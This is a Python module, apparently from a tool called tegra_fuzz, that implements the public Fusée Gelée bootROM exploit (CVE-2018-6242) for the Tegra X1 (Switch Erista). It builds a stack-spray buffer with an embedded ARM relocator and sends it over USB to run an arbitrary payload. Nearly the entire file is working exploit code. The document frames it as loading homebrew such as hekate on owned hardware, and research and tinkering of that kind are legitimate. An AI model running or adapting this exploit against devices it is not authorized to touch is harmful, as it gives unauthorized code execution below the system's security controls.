"""Send an RCM payload to the Tegra X1 via CVE-2018-6242 (Fusée Gelée).

Implements the well-documented bootROM USB stack overflow for the T210 (Erista).
The vulnerability is in mask ROM and cannot be patched. This module loads legitimate
payloads (e.g., hekate for NAND backup) on owned hardware.

Reference: the public fusee-launcher by Kate Temkin / ReSwitched (2018).
"""
from __future__ import annotations

import struct
import sys
import time
from pathlib import Path

from . import rcm
from .transport import TransportError

# T210 (Erista) IRAM addresses — from the public fusee-launcher.
RCM_PAYLOAD_ADDR = 0x40010000
INTERMEZZO_LOCATION = 0x4001F000
PAYLOAD_LOAD_BLOCK = 0x40020000
COPY_BUFFER_ADDRESSES = [0x40005000, 0x40009000]
STACK_END = 0x40010000

EXPLOIT_HEADER_SIZE = 680
EXPLOIT_MAX_LENGTH = 0x30298

# Reference intermezzo from Smeat/fusee-launcher (92 bytes).
# Two-phase relocator: first copies itself to START_OF_IRAM (0x40000000),
# then copies the payload from PAYLOAD_LOAD_BLOCK to RCM_PAYLOAD_ADDR and
# jumps to it.  Self-relocation is critical — without it the payload copy
# overwrites the intermezzo code while it is still executing.
_INTERMEZZO = bytes([
    0x44, 0x00, 0x9F, 0xE5,  # ldr  r0, =post_relocation
    0x01, 0x11, 0xA0, 0xE3,  # mov  r1, #0x40000000
    0x40, 0x20, 0x9F, 0xE5,  # ldr  r2, =intermezzo_end
    0x00, 0x20, 0x42, 0xE0,  # sub  r2, r2, r0
    0x08, 0x00, 0x00, 0xEB,  # bl   copy
    0x01, 0x01, 0xA0, 0xE3,  # mov  r0, #0x40000000
    0x10, 0xFF, 0x2F, 0xE1,  # bx   r0
    0x00, 0x00, 0xA0, 0xE1,  # nop  (.align)
    # post_relocation:
    0x2C, 0x00, 0x9F, 0xE5,  # ldr  r0, =PAYLOAD_LOAD_BLOCK
    0x2C, 0x10, 0x9F, 0xE5,  # ldr  r1, =RCM_PAYLOAD_ADDR
    0x02, 0x28, 0xA0, 0xE3,  # mov  r2, #0x20000
    0x01, 0x00, 0x00, 0xEB,  # bl   copy
    0x20, 0x00, 0x9F, 0xE5,  # ldr  r0, =RCM_PAYLOAD_ADDR
    0x10, 0xFF, 0x2F, 0xE1,  # bx   r0
    # copy:
    0x04, 0x30, 0x90, 0xE4,  # ldr  r3, [r0], #4
    0x04, 0x30, 0x81, 0xE4,  # str  r3, [r1], #4
    0x04, 0x20, 0x52, 0xE2,  # subs r2, r2, #4
    0xFB, 0xFF, 0xFF, 0x1A,  # bne  copy
    0x1E, 0xFF, 0x2F, 0xE1,  # bx   lr
    # literal pool:
    0x20, 0xF0, 0x01, 0x40,  # .word 0x4001F020  (post_relocation)
    0x5C, 0xF0, 0x01, 0x40,  # .word 0x4001F05C  (intermezzo_end)
    0x00, 0x00, 0x02, 0x40,  # .word 0x40020000  (PAYLOAD_LOAD_BLOCK)
    0x00, 0x00, 0x01, 0x40,  # .word 0x40010000  (RCM_PAYLOAD_ADDR)
])


def build_exploit(payload: bytes) -> bytes:
    """Construct the full exploit buffer: header + stack spray + intermezzo + payload."""
    buf = bytearray()

    # 1. RCM command header: 4-byte LE length + padding to 680 bytes.
    buf += struct.pack("<I", EXPLOIT_MAX_LENGTH)
    buf += b"\x00" * (EXPLOIT_HEADER_SIZE - len(buf))

    # 2. Stack spray: fill from RCM_PAYLOAD_ADDR to INTERMEZZO_LOCATION
    #    with the intermezzo entry address so the smashed return address
    #    always lands in the intermezzo.
    spray_count = (INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDR) // 4
    buf += struct.pack("<I", INTERMEZZO_LOCATION) * spray_count

    # 3. Intermezzo relocator.
    buf += _INTERMEZZO

    # 4. Pad to PAYLOAD_LOAD_BLOCK offset.
    payload_offset = EXPLOIT_HEADER_SIZE + (PAYLOAD_LOAD_BLOCK - RCM_PAYLOAD_ADDR)
    if len(buf) < payload_offset:
        buf += b"\x00" * (payload_offset - len(buf))

    # 5. Main payload.
    buf += payload

    # 6. Pad to 0x1000 boundary.
    remainder = len(buf) % 0x1000
    if remainder:
        buf += b"\x00" * (0x1000 - remainder)

    return bytes(buf)


# -- High-level sender ----------------------------------------------------------

class PayloadSender:
    """Send an RCM payload using the Fusée Gelée exploit.

    Matches the reference fusee-launcher flow:
      1. pyusb: open, configure, claim, read device ID
      2. pyusb: write exploit buffer in 0x1000-byte chunks (timeouts are OK)
      3. pyusb: switch to high DMA buffer if needed (ctrl_transfer)
      4. pyusb: trigger the vulnerability with GET_STATUS ctrl_transfer
    """

    def __init__(self, vid: int = rcm.VID, pid: int = rcm.PID):
        self.vid = vid
        self.pid = pid
        self._dev = None
        self._current_buffer = 0

    def _find(self):
        import usb.core
        return usb.core.find(idVendor=self.vid, idProduct=self.pid)

    def open(self) -> None:
        import usb.core
        import usb.util
        dev = self._find()
        if dev is None:
            raise TransportError("no_device", "APX device not found")
        try:
            if dev.is_kernel_driver_active(rcm.INTERFACE):
                dev.detach_kernel_driver(rcm.INTERFACE)
        except (NotImplementedError, usb.core.USBError):
            pass
        try:
            dev.set_configuration()
            usb.util.claim_interface(dev, rcm.INTERFACE)
        except usb.core.USBError as exc:
            raise TransportError("error", str(exc)) from exc
        self._dev = dev

    def close(self) -> None:
        if self._dev is not None:
            import usb.util
            try:
                usb.util.dispose_resources(self._dev)
            except Exception:
                pass
        self._dev = None

    def read_device_id(self) -> bytes:
        return bytes(self._dev.read(rcm.EP_IN, rcm.DEVICE_ID_LENGTH, timeout=1000))

    def _toggle_buffer(self):
        self._current_buffer = 1 - self._current_buffer

    def _write_single_buffer(self, data: bytes) -> None:
        """Write one chunk. Toggles the buffer tracker. Timeouts are ignored
        (the reference implementation does the same — data still gets through)."""
        import usb.core
        self._toggle_buffer()
        try:
            self._dev.write(rcm.EP_OUT, data, timeout=5000)
        except usb.core.USBTimeoutError:
            pass

    def _trigger_controlled_memcpy(self, length: int | None = None) -> None:
        """Send GET_STATUS to trigger the controlled memcpy vulnerability.

        Uses pyusb ctrl_transfer — synchronous, so the setup packet is
        guaranteed to reach the device before we return.  The transfer will
        time out (the device is busy executing the payload), which is expected.
        """
        import usb.core
        if length is None:
            length = COPY_BUFFER_ADDRESSES[1] - COPY_BUFFER_ADDRESSES[0]
        try:
            self._dev.ctrl_transfer(0x82, 0x00, 0, 0, length)
        except usb.core.USBError:
            pass

    def _switch_to_highbuf(self) -> None:
        """If the current DMA buffer is LOW, trigger a controlled memcpy to
        advance it.  Matches the reference fusee-launcher."""
        if self._current_buffer == 0:
            self._trigger_controlled_memcpy()

    def send(self, payload_path: Path) -> None:
        """Open the device, exploit, and send the payload."""
        payload = payload_path.read_bytes()
        exploit = build_exploit(payload)
        total_chunks = len(exploit) // 0x1000

        print(f"  payload    : {payload_path.name} ({len(payload)} bytes)", file=sys.stderr)
        print(f"  exploit buf: {len(exploit)} bytes ({total_chunks} chunks)", file=sys.stderr)

        self.open()
        try:
            device_id = self.read_device_id()
            print(f"  device id  : {device_id.hex()}", file=sys.stderr)

            timeouts = 0
            for i, off in enumerate(range(0, len(exploit), 0x1000)):
                self._write_single_buffer(exploit[off:off + 0x1000])
                if (i + 1) % 10 == 0 or i + 1 == total_chunks:
                    suffix = f" ({timeouts} timeouts)" if timeouts else ""
                    print(f"\r  writing    : {i + 1}/{total_chunks} chunks{suffix}",
                          end="", file=sys.stderr)
            print(file=sys.stderr)

            print(f"  switching  : buffer={self._current_buffer}", file=sys.stderr)
            self._switch_to_highbuf()
            print("  triggering : GET_STATUS wLength=0x4000", file=sys.stderr)
            self._trigger_controlled_memcpy()
            time.sleep(1)
            print("  done — check the Switch screen.", file=sys.stderr)
        finally:
            self.close()


def main(argv: list[str] | None = None) -> int:
    import argparse
    p = argparse.ArgumentParser(
        prog="tegra_fuzz.payload",
        description="Send an RCM payload to a Tegra X1 (Erista) in recovery mode "
                    "via CVE-2018-6242 (Fusée Gelée).",
    )
    p.add_argument("payload", type=Path,
                   help="path to the payload binary (e.g. hekate_ctcaer_6.5.5.bin)")
    args = p.parse_args(argv)

    if not args.payload.exists():
        print(f"error: payload not found: {args.payload}", file=sys.stderr)
        return 2

    payload_size = args.payload.stat().st_size
    max_payload = 0x40040000 - PAYLOAD_LOAD_BLOCK
    if payload_size > max_payload:
        print(f"error: payload too large ({payload_size} bytes, max {max_payload})",
              file=sys.stderr)
        return 2

    print("tegra_fuzz payload sender — CVE-2018-6242 (Fusée Gelée)", file=sys.stderr)
    print(f"  target     : VID 0x{rcm.VID:04x} PID 0x{rcm.PID:04x} "
          f"(Tegra X1 APX / recovery mode)", file=sys.stderr)

    sender = PayloadSender()
    try:
        sender.send(args.payload)
    except TransportError as exc:
        if exc.kind == "no_device":
            print("error: Tegra APX device not found — put the console in RCM mode "
                  "and connect it.", file=sys.stderr)
        elif exc.kind == "permission":
            print("error: permission denied — run with sudo or add yourself to the "
                  "owning udev group.", file=sys.stderr)
        else:
            print(f"error: {exc}", file=sys.stderr)
        return 2
    except Exception as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
